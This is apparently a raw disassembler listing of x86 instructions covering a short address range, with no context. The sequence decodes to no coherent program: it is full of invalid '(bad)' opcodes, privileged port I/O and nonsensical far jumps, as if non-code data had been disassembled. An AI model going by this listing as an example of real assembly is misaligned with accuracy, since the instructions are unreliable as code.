  514a9a:	(bad)  
  514a9b:	jae    0x514a59
  514a9d:	in     eax,0x2f
  514a9f:	cmp    ebx,ebp
  514aa1:	int    0x88
  514aa3:	jbe    0x514ade
  514aa5:	(bad)  
  514aa6:	mov    ch,0x53
  514aa8:	mul    DWORD PTR [edi-0x58]
  514aab:	or     al,0x88
  514aad:	int3   
  514aae:	outs   dx,DWORD PTR ds:[esi]
  514aaf:	sub    BYTE PTR [edx-0x58],ch
  514ab2:	adc    eax,0x14c2ae62
  514ab7:	and    edi,DWORD PTR [eax-0x1c06fefc]
  514abd:	scas   eax,DWORD PTR es:[edi]
  514abe:	pusha  
  514abf:	jns    0x514ac3
  514ac1:	mov    esp,0x34395fb
  514ac6:	aas    
  514ac7:	pop    es
  514ac8:	add    BYTE PTR [ecx-0x4e],bl
  514acb:	sub    bh,BYTE PTR [ecx]
  514acd:	popa   
  514ace:	pop    ds
  514acf:	sub    eax,0xffffff87
  514ad2:	mov    al,ds:0x98a723ed
  514ad7:	icebp  
  514ad8:	mov    eax,0xc704ac4a
  514add:	out    0xf9,eax
  514adf:	div    BYTE PTR [ebx+0x9]
  514ae2:	cmp    al,0x25
  514ae4:	ret    0x6d55
  514ae7:	or     al,0x15
  514ae9:	sar    DWORD PTR [ebx],cl
  514aeb:	jg     0x514aa1
  514aed:	pop    eax
  514aee:	std    
  514aef:	ret    
  514af0:	add    DWORD PTR [ecx+0x252095d4],eax
  514af6:	out    0x10,al
  514af8:	mov    ah,0x4b
  514afa:	lock aaa 
  514afc:	add    al,0xbb
  514afe:	ds cs pop ebx
  514b01:	es mov esi,0x11050998
  514b07:	sub    eax,0x34d330e5
  514b0c:	cmp    bh,BYTE PTR [edx]
  514b0e:	pop    es
  514b0f:	sti    
  514b10:	mov    bl,0x73
  514b12:	stos   DWORD PTR es:[edi],eax
  514b13:	shr    DWORD PTR [esi],1
  514b15:	sub    ecx,DWORD PTR [ebp-0x7c7e8167]
  514b1b:	jno    0x514b59
  514b1d:	pop    ebp
  514b1e:	mov    esp,0xf590627a
  514b23:	sbb    DWORD PTR ds:0x7b71aea8,ebx
  514b29:	inc    ebx
  514b2a:	xor    DWORD PTR [ecx],0xffffff8c
  514b2d:	mov    edx,0x703444c2
  514b32:	xor    esp,DWORD PTR [edi+0x6]
  514b35:	push   0x32d948a9
  514b3a:	mov    ds:0x37a2f0e4,eax
  514b3f:	inc    ebx
  514b40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  514b41:	jne    0x514acb
  514b43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  514b44:	adc    DWORD PTR [ecx],edx
  514b46:	jp     0x514b04
  514b48:	(bad)  
  514b49:	push   ebp
  514b4a:	push   0x86378bce
  514b4f:	addr16 retf 0x281d
  514b53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  514b54:	xor    BYTE PTR [ecx-0x78],0x97
  514b58:	sub    ah,BYTE PTR [eax+esi*8+0x246bc86]
  514b5f:	scas   eax,DWORD PTR es:[edi]
  514b60:	push   es
  514b61:	xchg   esi,eax
  514b62:	test   DWORD PTR [eax+ebx*4+0x4ac1bb10],esi
  514b69:	mov    edi,0x9938e11f
  514b6e:	sub    WORD PTR [ecx],cx
  514b71:	jge    0x514b36
  514b73:	mov    BYTE PTR [ecx-0x3ad72a6f],bh
  514b79:	jne    0x514bca
  514b7b:	push   ss
  514b7c:	dec    ecx
  514b7d:	and    bl,ah
  514b7f:	push   cs
  514b80:	lahf   
  514b81:	dec    esp
  514b82:	pop    ecx
  514b83:	lods   eax,DWORD PTR ds:[esi]
  514b84:	out    0xf0,al
  514b86:	or     bh,BYTE PTR [ebp-0x4caf344d]
  514b8c:	mov    ds:0x58fdb10e,eax
  514b91:	data16 or al,0x2
  514b94:	jg     0x514ba0
  514b96:	lock dec edi
  514b98:	xchg   edi,eax
  514b99:	cmp    esp,DWORD PTR [eax+0xf]
  514b9c:	neg    BYTE PTR [edx-0x47b25ddd]
  514ba2:	icebp  
  514ba3:	loope  0x514c18
  514ba5:	out    dx,eax
  514ba6:	pop    es
  514ba7:	xor    eax,edx
  514ba9:	jle    0x514c25
  514bab:	add    edx,DWORD PTR [esi-0x2127db1a]
  514bb1:	rol    DWORD PTR [ebx+eax*2-0x5],cl
  514bb5:	mov    ebx,0xc00e8b22
  514bba:	xchg   esp,eax
  514bbb:	pushf  
  514bbc:	jl     0x514bb2
  514bbe:	dec    esp
  514bbf:	dec    edi
  514bc0:	pop    ds
  514bc1:	jo     0x514b48
  514bc3:	mov    eax,0x24294ea1
  514bc8:	das    
  514bc9:	shl    dl,0x7e
  514bcc:	and    ah,dl
  514bce:	jae    0x514bce
  514bd0:	sti    
  514bd1:	jmp    0x536b8aec
  514bd6:	xor    eax,0xe45e86e
  514bdb:	test   DWORD PTR [ebx+0x34],eax
  514bde:	dec    edx
  514bdf:	lds    ebx,FWORD PTR [eax]
  514be1:	mov    al,cl
  514be3:	out    0x93,al
  514be5:	mov    esp,0x7a238619
  514bea:	push   cs
  514beb:	or     dh,BYTE PTR [ecx+ebx*8+0xc2e4c30]
  514bf2:	sti    
  514bf3:	push   esi
  514bf4:	jae    0x514c62
  514bf6:	sub    al,0xc0
  514bf8:	cmp    ebp,DWORD PTR [edi]
  514bfa:	jmp    0x8c368d9f
  514bff:	add    DWORD PTR [edx],ecx
  514c01:	ja     0x514c7c
  514c03:	popa   
  514c04:	jno    0x514bda
  514c06:	jbe    0x514c18
  514c08:	xor    al,BYTE PTR [ecx-0x590fd283]
  514c0e:	dec    ebp
  514c0f:	add    eax,0xfb270c1a
  514c14:	shl    DWORD PTR [ecx-0x1cf10803],0xd8
  514c1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  514c1c:	add    ebp,DWORD PTR [ecx-0x4]
  514c1f:	inc    eax
  514c20:	ror    BYTE PTR [eax+ecx*2-0x6c63a29d],0xed
  514c28:	lock pop esi
  514c2a:	lods   al,BYTE PTR ds:[esi]
  514c2b:	push   ds
  514c2c:	scas   al,BYTE PTR es:[edi]
  514c2d:	add    DWORD PTR [eax],ebp
  514c2f:	ds aas 
  514c31:	sbb    ch,BYTE PTR [ebp+0x59]
  514c34:	mov    edi,0x660e3459
  514c39:	dec    edx
  514c3a:	xor    dh,bl
  514c3c:	inc    esi
  514c3d:	mov    WORD PTR [ebx-0x5bfcc435],cs
  514c43:	jno    0x514c8e
  514c45:	xchg   ecx,eax
  514c46:	out    dx,al
  514c47:	or     al,BYTE PTR [esp+eax*1]
  514c4a:	push   ebp
  514c4b:	jle    0x514cb3
  514c4d:	cmp    eax,0xffe84cd9
  514c52:	mov    eax,ds:0x821a1bd2
  514c57:	pop    eax
  514c58:	mov    ebx,0x3b63b167
  514c5d:	sub    BYTE PTR [edi+ebp*2+0x28],0xf0
  514c62:	shl    DWORD PTR [esi+ebx*8+0x16],1
  514c66:	sbb    BYTE PTR [edi+0x5a0ba310],0x86
  514c6d:	mov    esi,0xbf6f4bde
  514c72:	jb     0x514c90
  514c74:	cmp    ecx,edi
  514c76:	add    BYTE PTR [ecx+0x7d],ch
  514c79:	or     DWORD PTR [ebx+0x53],esp
  514c7c:	imul   BYTE PTR [edx-0x40]
  514c7f:	push   0xd0fd3975
  514c84:	and    al,0x93
  514c86:	cmp    dl,dl
  514c88:	add    al,0xba
  514c8a:	xor    DWORD PTR [esp+eax*4],edx
  514c8d:	cmp    al,0x50
  514c8f:	pop    ecx
  514c90:	and    esp,DWORD PTR [esi+0x39928871]
  514c96:	int    0xf3
  514c98:	mov    bl,0xb
  514c9a:	ss aaa 
  514c9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  514c9d:	ficomp WORD PTR [edx+0x4d]
  514ca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  514ca1:	sbb    BYTE PTR [esi-0x615b67f1],0xb7
  514ca8:	mov    al,ds:0xf6d0e2fa
  514cad:	stc    
  514cae:	pop    edi
  514caf:	inc    ecx
  514cb0:	jo     0x514c80
  514cb2:	icebp  
  514cb3:	add    ah,BYTE PTR [ebp-0x7e]
  514cb6:	add    esp,DWORD PTR [edx]
  514cb8:	in     eax,0xc9
  514cba:	addr16 aad 0x5d
  514cbd:	out    0xbc,al
  514cbf:	push   es
  514cc0:	mov    WORD PTR [ecx-0x7f],ss
  514cc3:	jns    0x514ca7
  514cc5:	xchg   DWORD PTR [eax-0xb],esi
  514cc8:	cmp    bl,BYTE PTR [esi+edx*1-0x4e88984e]
  514ccf:	add    DWORD PTR [edx],eax
  514cd1:	inc    esp
  514cd2:	ret    
  514cd3:	push   esp
  514cd4:	es dec ebp
  514cd6:	push   eax
  514cd7:	sub    eax,0x49adf6a4
  514cdc:	adc    DWORD PTR [edi],eax
  514cde:	shl    dh,0xd2
  514ce1:	mov    al,ds:0x210c4cfc
  514ce6:	sbb    eax,0xc61c975e
  514ceb:	fadd   QWORD PTR [edx]
  514ced:	and    al,BYTE PTR [esi+edx*2-0x23]
  514cf1:	xor    al,0xd5
  514cf3:	dec    eax
  514cf4:	jae    0x514d0a
  514cf6:	loope  0x514cd1
  514cf8:	sbb    ebx,edx
  514cfa:	push   ecx
  514cfb:	mov    bl,0xd8
  514cfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  514cfe:	in     eax,0xc7
  514d00:	aam    0x59
  514d02:	pop    ds
  514d03:	in     eax,dx
  514d04:	xor    al,0x76
  514d06:	cdq    
  514d07:	fwait
  514d08:	adc    cl,BYTE PTR [eax]
  514d0a:	add    eax,0xf4ee6a7f
  514d0f:	sub    ebx,0xffffffba
  514d12:	ret    0xb2ad
  514d15:	lock (bad) 
  514d17:	fisubr WORD PTR [ebp-0x62cec4ba]
  514d1d:	mov    BYTE PTR es:[ecx+eax*8+0x79],al
  514d22:	nop
  514d23:	jnp    0x514cc7
  514d25:	(bad)  
  514d26:	jmp    0xfeed:0xc2b64385
  514d2d:	pop    es
  514d2e:	in     eax,dx
  514d2f:	(bad)  
  514d30:	imul   ebx,ebx,0x3ec9fa6d
  514d36:	push   ebx
  514d37:	aaa    
  514d38:	sub    al,0xaa
  514d3a:	iret   
  514d3b:	ds add eax,0x787cf2a4
  514d41:	das    
  514d42:	and    BYTE PTR [edx*4-0x31f12144],dh
  514d49:	jl     0x514dc1
  514d4b:	mov    ch,0x6d
  514d4d:	ret    0xc449
  514d50:	lds    ecx,FWORD PTR [ecx+0x1f672985]
  514d56:	push   eax
  514d57:	mov    ch,0x2b
  514d59:	push   esp
  514d5a:	add    esp,ebp
  514d5c:	ss loopne 0x514dac
  514d5f:	pop    ss
  514d60:	out    dx,al
  514d61:	call   0x5fa4:0x1f38457c
  514d68:	add    ecx,esp
  514d6a:	add    eax,0xefa2179b
  514d6f:	mov    esp,0x68bf1685
  514d74:	into   
  514d75:	cdq    
  514d76:	jbe    0x514dc4
  514d78:	out    0x84,eax
  514d7a:	out    dx,eax
  514d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  514d7c:	pmaxub mm6,QWORD PTR [esi]
  514d7f:	mov    eax,0xcae27fa7
  514d84:	mov    eax,0x2b5dae36
  514d89:	sub    dl,BYTE PTR [edx]
  514d8b:	sub    ebx,DWORD PTR [eax]
  514d8d:	xor    DWORD PTR [ecx],edx
  514d8f:	dec    ebp
  514d90:	xchg   ebp,eax
  514d91:	mov    bh,0xe0
  514d93:	adc    esp,0x59edc96a
  514d99:	loope  0x514e1a
  514d9b:	inc    edi
  514d9c:	xlat   BYTE PTR ds:[ebx]
  514d9d:	jecxz  0x514db8
  514d9f:	sub    BYTE PTR [edi+ebx*2],bh
  514da2:	mov    ds:0x4efa3262,eax
  514da7:	xlat   BYTE PTR ds:[ebx]
  514da8:	mov    ebx,0x543278aa
  514dad:	push   0xffffff9e
  514daf:	sbb    al,0xad
  514db1:	retf   0x17e0
  514db4:	popf   
  514db5:	jnp    0x514dc7
  514db7:	sub    al,0xef
  514db9:	jbe    0x514da8
  514dbb:	popa   
  514dbc:	inc    eax
  514dbd:	mov    gs,WORD PTR [ebp-0x64]
  514dc0:	cld    
  514dc1:	cwde   
  514dc2:	ror    DWORD PTR [ecx-0x4d25984a],1
  514dc8:	(bad)
  514dcb:	sar    DWORD PTR [esi+edx*1+0x16cc1f8b],0x1d
  514dd3:	lea    esp,[edi+0x60908c54]
  514dd9:	adc    DWORD PTR [ecx-0x1b],esi
  514ddc:	xchg   edi,eax
  514ddd:	push   edi
  514dde:	popa   
  514ddf:	loope  0x514dd3
  514de1:	cld    
  514de2:	and    esi,DWORD PTR [ebx]
  514de4:	les    esi,FWORD PTR [ebx]
  514de6:	inc    edi
  514de7:	ficomp DWORD PTR [edx-0x2ea682f4]
  514ded:	int    0x98
  514def:	inc    ecx
  514df0:	out    0x8,al
  514df2:	or     eax,0x359967e6
  514df7:	inc    edx
  514df8:	popf   
  514df9:	fidivr WORD PTR [esi]
  514dfb:	add    al,0x45
  514dfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  514dfe:	div    BYTE PTR [edx+esi*2]
  514e01:	retf   0x99ed
  514e04:	pusha  
  514e05:	add    al,0x43
  514e07:	inc    edx
  514e08:	popa   
  514e09:	int    0x93
  514e0b:	pushf  
  514e0c:	shl    ah,0x38
  514e0f:	(bad)  
  514e10:	fistp  WORD PTR [eax-0x109bcd2a]
  514e16:	aas    
  514e17:	or     BYTE PTR [ebp+0x533b5c06],al
  514e1d:	xchg   bh,dh
  514e1f:	push   edx
  514e20:	fld    TBYTE PTR [ebx]
  514e22:	adc    ecx,DWORD PTR [ebx-0x58eadb9b]
  514e28:	dec    esi
  514e29:	scas   al,BYTE PTR es:[edi]
  514e2a:	ret    
  514e2b:	push   ebx
  514e2c:	ins    BYTE PTR es:[edi],dx
  514e2d:	xchg   ecx,eax
  514e2e:	jb     0x514e85
  514e30:	lods   al,BYTE PTR ds:[esi]
  514e31:	bound  esi,QWORD PTR [ebp-0xb]
  514e34:	imul   esi,ebx,0x26
  514e37:	and    DWORD PTR [ebx+0x73],edx
  514e3a:	push   eax
  514e3b:	pusha  
  514e3c:	sahf   
  514e3d:	dec    eax
  514e3e:	mov    ah,0x1a
  514e40:	push   ss
  514e41:	adc    eax,0xd2cb0c05
  514e46:	popf   
  514e47:	sub    bh,ah
  514e49:	push   esp
  514e4a:	mov    ch,0x67
  514e4c:	popa   
  514e4d:	add    BYTE PTR [edi],bh
  514e4f:	jl     0x514df5
  514e51:	outs   dx,DWORD PTR fs:[esi]
  514e53:	outs   dx,BYTE PTR cs:[esi]
  514e55:	cli    
  514e56:	and    DWORD PTR [esi-0x6a],ecx
  514e59:	and    ch,BYTE PTR [ebx+0x69]
  514e5c:	pop    ebx
  514e5d:	int    0xf5
  514e5f:	in     eax,dx
  514e60:	or     cl,dh
  514e62:	jmp    0x924e:0xcc63b83f
  514e69:	sub    DWORD PTR [esi+0x2ddd0218],ecx
  514e6f:	xchg   DWORD PTR [esi],esi
  514e71:	mov    dh,0xfe
  514e73:	mov    ecx,0xee3fe9ac
  514e78:	in     al,dx
  514e79:	(bad)  
  514e7a:	sar    DWORD PTR [ebx-0x43],1
  514e7d:	jp     0x514dff
  514e7f:	out    dx,al
  514e80:	or     BYTE PTR [ecx-0x466eeae7],dh
  514e86:	inc    edi
  514e87:	loopne 0x514e9c
  514e89:	sub    al,0x92
  514e8b:	fwait
  514e8c:	mov    edx,0x61acc43a
  514e91:	pushf  
  514e92:	pusha  
  514e93:	retf   0xb892
  514e96:	jb     0x514e28
  514e98:	hlt    
  514e99:	or     ch,BYTE PTR [ebx+eax*8]
  514e9c:	lods   eax,DWORD PTR ds:[esi]
  514e9d:	scas   al,BYTE PTR es:[edi]
  514e9e:	stc    
  514e9f:	mov    ecx,0x6e50af47
  514ea4:	aas    
  514ea5:	or     DWORD PTR [eax],eax
  514ea7:	sbb    al,0x4f
  514ea9:	(bad)  
  514eaa:	or     al,0xd6
  514eac:	mov    esi,DWORD PTR [ebp+0x1d771edf]
  514eb2:	mov    esi,0xc6414980
  514eb7:	pop    esi
  514eb8:	push   ss
  514eb9:	push   0x900abf86
  514ebe:	aam    0xf8
  514ec0:	rol    BYTE PTR [edx+0x19],cl
  514ec3:	mov    ebp,?
  514ec5:	jle    0x514ee1
  514ec7:	jp     0x514f00
  514ec9:	les    esp,FWORD PTR [ecx]
  514ecb:	inc    edi
  514ecc:	mov    esi,0xc659b76c
  514ed1:	cmc    
  514ed2:	cs int 0x1b
  514ed5:	in     eax,0x79
  514ed7:	outs   dx,DWORD PTR ds:[esi]
  514ed8:	jg     0x514e9c
  514eda:	daa    
  514edb:	mov    edx,0x5f7adbb8
  514ee0:	dec    esi
  514ee1:	jmp    0x45f:0xfb53b89d
  514ee8:	sbb    ebx,DWORD PTR [edi]
  514eea:	or     DWORD PTR [esi+0x2e],edi
  514eed:	xchg   esp,eax
  514eee:	mov    al,ds:0xf16ee99
  514ef3:	mov    edx,0x11691ee1
  514ef8:	jl     0x514eb9
  514efa:	leave  
  514efb:	inc    ebx
  514efc:	push   ebp
  514efd:	loopne 0x514ee1
  514eff:	data16 add dh,BYTE PTR [esi+0x29]
  514f03:	jmp    0x514e9c
  514f05:	push   esp
  514f06:	aas    
  514f07:	xchg   esp,eax
  514f08:	ja     0x514ea9
  514f0a:	test   eax,0x607bf413
  514f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  514f10:	adc    al,0x96
  514f12:	loope  0x514ed2
  514f14:	cmp    eax,0x9efc2b5a
  514f19:	jno    0x514ee4
  514f1b:	(bad)  
  514f1c:	iret   
  514f1d:	mov    ecx,0xfaa9f386
  514f22:	jl     0x514ede
  514f24:	adc    al,0xf6
  514f26:	push   ecx
  514f27:	adc    al,0xbf
  514f2a:	lock retf 0xc226
  514f2e:	je     0x514eec
  514f30:	mov    eax,ds:0xc5aec6be
  514f35:	fmulp  st(7),st
  514f37:	or     DWORD PTR [edi-0x17fb4944],ebp
  514f3d:	dec    ebx
  514f3e:	cmp    al,0x9
  514f40:	adc    DWORD PTR [esi],0xfffffffd
  514f43:	sbb    eax,0x849c8dc6
  514f48:	in     al,0x79
  514f4a:	(bad)
  514f4e:	adc    DWORD PTR [ebp+0x51],esp
  514f51:	xor    ah,BYTE PTR [esi-0x55]
  514f54:	push   ss
  514f55:	jno    0x514f2c
  514f57:	push   ecx
  514f58:	add    esi,DWORD PTR [eax]
  514f5a:	sub    ebp,DWORD PTR [esi+0x39c0b0]
  514f60:	es cmp al,0xd0
  514f63:	test   eax,0x8d33a4e6
  514f68:	cli    
  514f69:	cmp    bh,BYTE PTR [edi+esi*2-0x7a]
  514f6d:	call   0xcae4f48f
  514f72:	jns    0x514f82
  514f74:	adc    al,0xc
  514f76:	push   edx
  514f77:	mov    BYTE PTR [ebp+0x61],0xe1
  514f7b:	out    dx,eax
  514f7c:	lock or al,0xf3
  514f7f:	mov    esp,0xc9ff15a6
  514f84:	lods   al,BYTE PTR ds:[esi]
  514f85:	cdq    
  514f86:	aam    0xa0
  514f88:	push   ecx
  514f89:	loop   0x514f48
  514f8b:	gs xchg ebp,eax
  514f8d:	in     eax,0xd2
  514f8f:	std    
  514f90:	jne    0x514f41
  514f92:	daa    
  514f93:	jmp    0x514f62
  514f95:	push   0x247a4898
  514f9a:	cli    
  514f9b:	xchg   ebx,eax
  514f9c:	push   ds
  514f9d:	(bad)  
  514f9e:	loopne 0x514f5a
  514fa0:	(bad)  
  514fa1:	pop    ecx
  514fa2:	and    ch,BYTE PTR ds:0x3f16b25f
  514fa8:	mov    ds:0xa9091d95,al
  514fad:	jmp    0x514f3a
  514faf:	push   es
  514fb0:	xchg   esi,eax
  514fb1:	sub    DWORD PTR [ecx+0x6f],esi
  514fb4:	je     0x514fb6
  514fb6:	mov    ah,0x1e
  514fb8:	mov    al,0xe6
  514fba:	into   
  514fbb:	popa   
  514fbc:	fistp  QWORD PTR [edx]
  514fbe:	clc    
  514fbf:	xchg   esi,eax
  514fc0:	or     DWORD PTR [eax-0x250572b0],ecx
  514fc6:	(bad)  [eax-0x5ec14b9a]
  514fcc:	mov    WORD PTR [eax-0x23],fs
  514fcf:	cmp    ch,BYTE PTR ds:0x29ad62cf
  514fd5:	pop    ebx
  514fd6:	sbb    eax,0xbdddcb7a
  514fdb:	dec    ebx
  514fdc:	clc    
  514fdd:	lods   eax,DWORD PTR ds:[esi]
  514fde:	jmp    0x515053
  514fe0:	jne    0x515055
  514fe2:	and    eax,0xf2e9b5fa
  514fe7:	sbb    al,BYTE PTR [esi+ebp*4+0x42]
  514feb:	test   dl,dl
  514fed:	cmp    dl,bh
  514fef:	cli    
  514ff0:	outs   dx,DWORD PTR ds:[esi]
  514ff1:	popa   
  514ff2:	aam    0xb8
  514ff4:	dec    ecx
  514ff5:	retf   
  514ff6:	pop    edx
  514ff7:	mov    ds:0x394b5462,eax
  514ffc:	dec    ecx
  514ffd:	push   eax
  514ffe:	and    DWORD PTR [edx],0x6f
  515001:	jbe    0x515060
  515003:	call   0x41c29725
  515008:	jecxz  0x514ffd
  51500a:	mov    eax,0x3abd153d
  51500f:	pop    bx
  515011:	icebp  
  515012:	xor    ch,al
  515014:	add    dl,BYTE PTR [esi]
  515016:	inc    esp
  515017:	out    dx,al
  515018:	gs pop edi
  51501a:	push   ss
  51501b:	test   eax,0x42179c7e
  515020:	mov    eax,0x2514a53a
  515025:	ins    DWORD PTR es:[edi],dx
  515026:	push   cs
  515027:	mov    bl,0x2d
  515029:	mul    DWORD PTR [ecx+0x6e]
  51502c:	lea    ebp,[ebx-0x46]
  51502f:	ficom  DWORD PTR [eax]
  515031:	cmp    ch,BYTE PTR [edi]
  515033:	call   0x69b6dfac
  515038:	push   0xffffffae
  51503a:	or     DWORD PTR [esi+0x5f1da448],0xed276bf2
  515044:	xchg   ecx,eax
  515045:	hlt    
  515046:	lds    ebx,FWORD PTR [eax+0x3c762eab]
  51504c:	sar    DWORD PTR [ebx-0x4a75c849],cl
  515052:	stc    
  515053:	(bad)  
  515054:	rol    DWORD PTR [ebp+0x7622d224],1
  51505a:	jae    0x51501f
  51505c:	repnz push eax
  51505e:	scas   eax,DWORD PTR es:[edi]
  51505f:	add    ecx,DWORD PTR [ebp+ecx*1+0x7de9f74a]
  515066:	shr    DWORD PTR [esi+eax*4+0x71ce73fd],cl
  51506d:	ret    
  51506e:	aaa    
  51506f:	inc    ecx
  515070:	push   esi
  515071:	lods   eax,DWORD PTR ds:[esi]
  515072:	adc    BYTE PTR [esi-0x6e4e6532],ah
  515078:	inc    eax
  515079:	mov    esp,0x61451a5b
  51507e:	ja     0x515023
  515080:	or     al,0x6b
  515082:	retf   
  515083:	inc    esp
  515084:	enter  0x6722,0x7c
  515088:	enter  0xd0c2,0x6f
  51508c:	out    0x9b,al
  51508e:	pop    ebp
  51508f:	adc    DWORD PTR [edx+0x72],0x1928324a
  515096:	jo     0x5150b0
  515098:	dec    esp
  515099:	and    eax,0xd8825e7c
  51509f:	inc    eax
  5150a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5150a1:	scas   al,BYTE PTR es:[edi]
  5150a2:	mov    ebx,0x4f314865
  5150a7:	xchg   dh,bh
  5150a9:	cdq    
  5150aa:	mov    ebx,0xf8eadcb7
  5150af:	sbb    BYTE PTR [edi-0x6fa47c81],dh
  5150b5:	pop    es
  5150b6:	pop    ebp
  5150b7:	cwde   
  5150b8:	mov    ebx,fs
  5150ba:	or     al,BYTE PTR [edi]
  5150bc:	dec    edi
  5150bd:	cld    
  5150be:	pop    ss
  5150bf:	and    BYTE PTR [ebx],ah
  5150c1:	int    0xea
  5150c3:	stos   BYTE PTR es:[edi],al
  5150c4:	jp     0x515075
  5150c6:	mov    ecx,0xcb149fa6
  5150cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5150cc:	ret    0x4cce
  5150cf:	mov    edi,0xf5d14a50
  5150d4:	lods   al,BYTE PTR ds:[esi]
  5150d5:	jmp    DWORD PTR [esp+eiz*2-0x66]
  5150d9:	cli    
  5150da:	cdq    
  5150db:	pop    edi
  5150dc:	imul   esp,DWORD PTR [edi+ebp*4],0x6d64ead5
  5150e3:	add    edi,ebp
  5150e5:	dec    edx
  5150e6:	sub    bh,cl
  5150e8:	add    DWORD PTR [esi+edx*1],0x19679070
  5150ef:	je     0x51507e
  5150f1:	or     dh,BYTE PTR ds:0x405179d
  5150f7:	arpl   WORD PTR [ebx+ebp*8+0x29],sp
  5150fb:	clc    
  5150fc:	mov    edx,0x11049af1
  515101:	dec    ecx
  515102:	(bad)  
  515103:	pop    esp
  515104:	pop    ebx
  515105:	mov    DWORD PTR [eax+0x122dedd],0xdf29976a
  51510f:	mov    eax,0x8de6ad70
  515114:	mov    ecx,0x4cda73b
  515119:	push   edx
  51511a:	cmpxchg DWORD PTR [ebp-0x3d783087],ebx
  515121:	push   ebx
  515122:	pop    edx
  515123:	add    esi,ebx
  515125:	xchg   BYTE PTR [esi],bl
  515127:	pop    eax
  515128:	cmp    ch,BYTE PTR [esi-0x34]
  51512b:	pop    esp
  51512c:	fmul   QWORD PTR [ecx+ecx*4]
  51512f:	push   ebp
  515130:	xor    ah,ah
  515132:	dec    ebx
  515133:	repnz fnclex 
  515136:	cmp    dh,0x20
  515139:	mov    eax,ds:0xbc7be5ce
  51513e:	inc    ebx
  51513f:	sbb    esp,0xfffffff5
  515142:	repz pushaw 
  515145:	mov    bh,0xa6
  515147:	call   0xb85c:0xb7ef4e39
  51514e:	sti    
  51514f:	jae    0x51510a
  515151:	cmp    DWORD PTR [edx+0x30],ecx
  515154:	jle    0x51515a
  515156:	lds    esi,FWORD PTR [edi-0x284a1ca6]
  51515c:	sub    BYTE PTR [edx+0x610bd712],bl
  515162:	call   0xae3a86d3
  515167:	inc    eax
  515168:	lods   eax,DWORD PTR ds:[esi]
  515169:	neg    BYTE PTR [ebx-0x5f]
  51516c:	int    0x95
  51516e:	loope  0x51516b
  515170:	sahf   
  515171:	aam    0xe7
  515173:	add    eax,0xf61d692a
  515178:	loopne 0x51512c
  51517a:	lods   eax,DWORD PTR ds:[esi]
  51517b:	iret   
  51517c:	add    ecx,edx
  51517e:	gs push ecx
  515180:	in     al,dx
  515181:	test   al,0x17
  515183:	xchg   ecx,eax
  515184:	add    al,0x60
  515186:	mov    ebp,ebp
  515188:	pop    eax
  515189:	and    BYTE PTR [ebx+0x7d],al
  51518c:	mov    eax,DWORD PTR [edx+0x16]
  51518f:	scas   eax,DWORD PTR es:[edi]
  515190:	push   ebp
  515191:	cli    
  515192:	stos   DWORD PTR es:[edi],eax
  515193:	dec    eax
  515194:	loop   0x51516b
  515196:	popf   
  515197:	push   ebp
  515198:	sbb    al,0x66
  51519a:	sbb    eax,DWORD PTR [ecx+0x447579b]
  5151a0:	dec    eax
  5151a1:	xchg   ebx,eax
  5151a2:	adc    dh,BYTE PTR [ebp-0x6a7db942]
  5151a8:	jge    0x5151fa
  5151aa:	out    dx,eax
  5151ab:	test   BYTE PTR [eax],dl
  5151ad:	pop    esi
  5151ae:	out    dx,eax
  5151af:	jecxz  0x5151ab
  5151b1:	dec    ecx
  5151b2:	pmulhw mm3,QWORD PTR [edx+0x4753fb12]
  5151b9:	pop    ds
  5151ba:	inc    eax
  5151bb:	loop   0x5151ec
  5151bd:	cdq    
  5151be:	dec    ebp
  5151bf:	sahf   
  5151c0:	ret    
  5151c1:	ss xor al,0xe5
  5151c4:	bound  esp,QWORD PTR [eax]
  5151c6:	shr    ecx,0x37
  5151c9:	or     eax,0x11a9c744
  5151ce:	mov    ecx,0xf4ad8ab2
  5151d3:	mov    ebx,0xeb4585df
  5151d8:	rcr    BYTE PTR [eax],1
  5151da:	pop    ebx
  5151db:	fcmovbe st,st(3)
  5151dd:	imul   eax,ebp,0x1d
  5151e0:	dec    ebp
  5151e1:	pop    esi
  5151e2:	sbb    BYTE PTR [esi+0x334f9c28],bh
  5151e8:	xor    DWORD PTR [ebp+0x14b1ff7a],esi
  5151ee:	repz mov bh,0x84
  5151f1:	mov    ebx,0x17380747
  5151f6:	push   ecx
  5151f7:	je     0x515215
  5151f9:	pop    edx
  5151fa:	or     BYTE PTR [ecx-0x30fad5b],ah
  515200:	mov    bh,0x80
  515202:	es inc esi
  515204:	xor    BYTE PTR [esi-0x62b46db3],ch
  51520a:	stos   BYTE PTR es:[edi],al
  51520b:	mov    ah,0xf0
  51520d:	aas    
  51520e:	scas   al,BYTE PTR es:[edi]
  51520f:	sbb    DWORD PTR [ecx+0x4b],0x5fc0b2a4
  515216:	push   0xffffff82
  515218:	mov    esi,0xee51b953
  51521d:	jnp    0x5151fe
  51521f:	je     0x515216
  515221:	(bad)  
  515222:	aam    0xbe
  515224:	add    DWORD PTR [ebp+0x43],0x128d605b
  51522b:	mov    cl,0xd6
  51522d:	xlat   BYTE PTR ds:[ebx]
  51522e:	jg     0x51520e
  515230:	(bad)  
  515231:	sbb    eax,0xe7edd36a
  515236:	fs in  eax,0x81
  515239:	mov    ebx,0xe5642429
  51523e:	fld    QWORD PTR [edx-0xe62e656]
  515244:	repz push esp
  515246:	imul   esp,DWORD PTR [eax+eax*1-0x35],0x7
  51524b:	shl    DWORD PTR [edi+ecx*8-0x30],cl
  51524f:	inc    ebp
  515250:	push   cs
  515251:	fadd   QWORD PTR [edx+0xc]
  515254:	pushf  
  515255:	sbb    eax,0x3871c80d
  51525a:	cmc    
  51525b:	mov    ds:0xa6d2d0c9,al
  515260:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  515261:	sar    DWORD PTR [eax+0x72bb11d3],0xb3
  515268:	shr    al,1
  51526a:	cld    
  51526b:	sub    esp,DWORD PTR [edx]
